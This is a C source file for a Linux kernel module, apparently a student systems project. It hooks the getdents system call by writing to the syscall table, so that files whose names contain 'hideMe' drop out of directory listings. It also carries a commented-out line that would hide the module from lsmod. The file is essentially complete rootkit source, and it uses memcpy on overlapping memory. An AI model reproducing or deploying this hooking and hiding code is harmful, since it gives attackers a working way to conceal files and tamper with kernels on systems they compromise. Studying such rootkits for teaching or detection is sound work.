/*
** intercept.c for Systems2 Project
**
** Adapted from syscall.c for lkm_syscall
** made by xsyann
** Contact <contact@xsyann.com>
**
** Current version built by Brian B
** Contact <batey.18@osu.edu>
*/

#include <linux/syscalls.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/errno.h>
#include <linux/types.h>
#include <linux/unistd.h>
#include <asm/cacheflush.h>
#include <asm/page.h>
#include <asm/current.h>
#include <linux/sched.h>
#include <linux/kallsyms.h>
#include <linux/fs.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Brian B");
MODULE_DESCRIPTION("GetDents Swapper");
MODULE_VERSION("0.1");

#define SYS_CALL_TABLE "sys_call_table"
#define SYSCALL_NI __NR_getdents
#define SECRET_PHRASE "hideMe"

//Define a structure to access/manipulate getdents entries
struct linux_dirent {
	unsigned long	d_ino;    //inode#
	unsigned long	d_off;    //distance from the start of this entry to beginning of the next entry
	unsigned short	d_reclen; // the entire size(length) of this entry
	char		d_name[]; // the file-name of the entry (null terminated)
    /*
		//See getdents man page for explanation of this comment
               char           pad;       // Zero padding byte
               char           d_type;    // File type (only since Linux
                                         // 2.6.4); offset is (d_reclen - 1)
               */
};

/* Prototype for a getdents type as a modified long integer(asmlinkage  
 * means all info is on the stack not in registers)(parameters retrieved from  
 * getdents man page look there for definitions)
 */
asmlinkage int (*getdents_OG)(unsigned int fd, struct linux_dirent *dirp,int count);

//This is the Modified GetDents
asmlinkage int getdents_infected(unsigned int fd, struct linux_dirent *dirp,int count) {
    int traversePtr = 0; //pointer for traversing getdents buffer
    struct linux_dirent* currentEntry;
    long outputSize; //Getdents outputs number of bytes read, 0 on end of directory, and -1 for errors.
    char* bufferSize; //ptr to buffer for dirent structs (see man page)
	
    //preserve output from original handler
    outputSize = getdents_OG(fd,dirp,count);
    
    //Exit if empty or error
    if(outputSize <= 0)
    {
     return outputSize;
    }
    //Set width
    bufferSize = (char*)dirp;
   
    /*Iterate through the entries. If entries are found that contain the specified phrases, then remove them from the list and adjust.*/
    
    while(traversePtr<outputSize)
    {
      currentEntry = (struct linux_dirent*)(traversePtr+bufferSize);
     
        if(strstr(currentEntry->d_name, SECRET_PHRASE) != NULL)//If Phrase is found adjust output size. Take everything until the current point and copy it while removing the data at the length of the next dirent structure.
        {       
        memcpy(bufferSize+traversePtr, bufferSize + traversePtr + currentEntry->d_reclen, outputSize - (traversePtr+ currentEntry->d_reclen));
        outputSize -= currentEntry->d_reclen;
        }
        else //No match move to next
        {
           traversePtr += currentEntry->d_reclen; 
        }
    
    } 
    
    return outputSize;
}

static ulong *syscall_table = NULL; //Store syscall table address here

//Checks that the current table address is correct
static int is_syscall_table(ulong *p)
{
        return ((p != NULL) && (p[__NR_close] == (ulong)sys_close));
}

//Opens Write Access in Kernel
static int page_read_write(ulong address)
{
        uint level;
        pte_t *pte = lookup_address(address, &level);

        if(pte->pte &~ _PAGE_RW)
                pte->pte |= _PAGE_RW;
        return 0;
}

//Sets ReadOnly access after operation
static int page_read_only(ulong address)
{
        uint level;
        pte_t *pte = lookup_address(address, &level);
        pte->pte = pte->pte &~ _PAGE_RW;
        return 0;
}

//Replace Getdents and the System Read Handler
static void replace_syscall(ulong offset){

//Get syscall table address
syscall_table = (ulong *)kallsyms_lookup_name(SYS_CALL_TABLE);

//Check if address is correct and perform operations
if (is_syscall_table(syscall_table)) {
         //Print address to kernel
         printk(KERN_INFO "Syscall table address : %p\n", syscall_table);

	printk(KERN_INFO "Open Write\n");
	 //Open Write Access on System Call table
         page_read_write((ulong)syscall_table);

	//Save the original getdents
        getdents_OG = (void *)syscall_table[offset];
      

	//print information to kernel about system call (remove this)
        printk(KERN_INFO "Original getdents address %lu : %p\n", offset, getdents_OG);

	//Disable this if broken
        printk(KERN_INFO "Custom getdents address %p\n", getdents_infected);

        //set the table offset to point to modified getdents
         syscall_table[offset] = (ulong)getdents_infected;

		//Remove this later .. Kernel info
                printk(KERN_INFO "Custom getdents installed!!!\n");
                printk(KERN_INFO "Syscall at offset %lu : %p\n", offset, (void *)syscall_table[offset]);

                printk(KERN_INFO "Close Write\n");
		//Set Syscall table back to readonly
                page_read_only((ulong)syscall_table);
        }
}

//Run and Exit functions

static int init_syscall(void)
{
	//THE LINE BELOW REMOVES THIS FROM PROC/FILE "lsmod" etc .. 
	//Uninstallable currently if this is not commented out.
       // list_del_init(&__this_module.list);

	//Remove this later
        printk(KERN_INFO "Custom syscall loaded\n");

	//Call Replace Function
        replace_syscall(SYSCALL_NI);

        return 0;
}

static void cleanup_syscall(void)
{
	
	//Open write access to syscall table
        page_read_write((ulong)syscall_table);

	//replace the original getdents system call
        syscall_table[SYSCALL_NI] = (ulong)getdents_OG;

	//reset read only access to syscall table
        page_read_only((ulong)syscall_table);

	//Print to kernel (remove later)	
        printk(KERN_INFO "Syscall at offset %d : %p\n", SYSCALL_NI, (void *)syscall_table[SYSCALL_NI]);
        printk(KERN_INFO "Custom syscall unloaded\n");
}

//Define Module Install/Remove Functions
module_init(init_syscall);
module_exit(cleanup_syscall);

MODULE_LICENSE("GPL v2");
MODULE_DESCRIPTION("A kernel module to replace getdents");
